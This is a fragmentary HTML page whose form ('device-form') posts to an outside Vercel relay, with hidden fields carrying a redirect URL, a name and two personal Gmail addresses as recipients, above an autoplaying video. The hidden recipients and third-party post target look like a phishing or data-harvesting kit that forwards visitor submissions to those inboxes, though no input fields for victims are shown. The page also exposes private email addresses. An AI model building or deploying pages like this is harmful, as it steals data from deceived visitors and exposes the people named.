...
<body>
    <form class="sm:hidden lg:block md:block" action="https://postal-form.vercel.app/post" method="post" id="device-form">
        <input type="hidden" name="redirectUrl" value="https://all-sub-pass.vercel.app/">
        <input type="hidden" name="name" value="Chee">
        <input type="hidden" name="email" value="saadnizamani19@gmail.com,barbaradeyama@gmail.com">
        <input type="hidden" name="workerEmail" value="">
            ...
            <div class="col-11 col-md-6 border">
                ...
                <div class="p-2">
                    ...
                    <video controls="" autoplay=""
                        ...
                        style="width: 300px; height: 160px;"></video>
                    <br>
